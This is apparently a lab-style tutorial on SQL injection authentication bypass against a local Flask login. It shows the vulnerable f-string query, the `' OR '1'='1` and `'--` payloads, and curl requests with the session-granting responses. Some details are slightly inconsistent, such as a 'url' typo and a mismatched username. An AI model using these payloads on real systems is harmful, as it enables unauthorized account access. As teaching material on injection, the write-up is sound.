# sql injection: the `' OR '1'='1' --` auth bypass

`get_user_by_credentials()` in `logic/auth.py` builds the login query like this:

```python
sql_query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

with normal input, `alice` / `secret`, that f-string becomes:

```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret'
```

looks harmless. the mental model that explains why it isn't: those quote marks aren't data, they're syntax the python code is typing out for you. mysql has no idea `'alice'` came from a web form, it just sees `'alice'` sitting in the query text exactly like it would if a developer had typed it by hand. the moment user input can contain a `'` of its own, that input stops being "the value between the quotes" and starts being "more sql the string happens to produce." that's the entire vulnerability in one sentence: the app is building the query out of untrusted text instead of handing mysql the text and the values separately.

## breaking it: `"login' OR '1'='1"` as the login

username `alice' OR '1'='1
the app still wraps its own quotes around whatever you typed, so the query becomes:

```sql
SELECT * FROM users WHERE username = 'alice' OR '1'='1' AND password = 'a'
```

this works because first sql evaluates everything to the left of OR, then everything to the right of OR and then ORs them, roughly:
`SELECT * FROM users WHERE (username = 'alice') OR (TRUE AND FALSE)`
```bash
curl -i -X POST http://127.0.0.1:5000/login -d username="alice' OR '1'='1" -d password=a
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.9 Python/3.11.18
Date: Thu, 29 Oct 2026 16:16:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Vary: Cookie
Set-Cookie: session=eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6ImFsaWNlIn0.auNxaw.eSNaWvCQh4q0eZThPl3vPN8Ec9s; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.

```
## breaking it with the comments '--'

you don't have to make a condition true, you can also delete the rest of the query. username `john' --`, password anything:

```sql
SELECT * FROM users WHERE username = 'john' -- ' AND password = 'whatever'
```

`john'` closes the username string same as before. `-- ` starts the comment immediately after, and everything to the right of it, the app's trailing quote and the entire password check, never gets evaluated. the query mysql actually runs is just:

```sql
SELECT * FROM users WHERE username = 'john'
```

```bash
url -i -X POST http://127.0.0.1:5000/login -d username="alice'-- " -d password=anything
HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.9 Python/3.11.18
Date: Thu, 29 Oct 2026 15:56:26 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Vary: Cookie
Set-Cookie: session=eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6ImFsaWNlIn0.auNsqg.8emRtXbbVrK6IpSNv16IrDw7-5g; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.

```

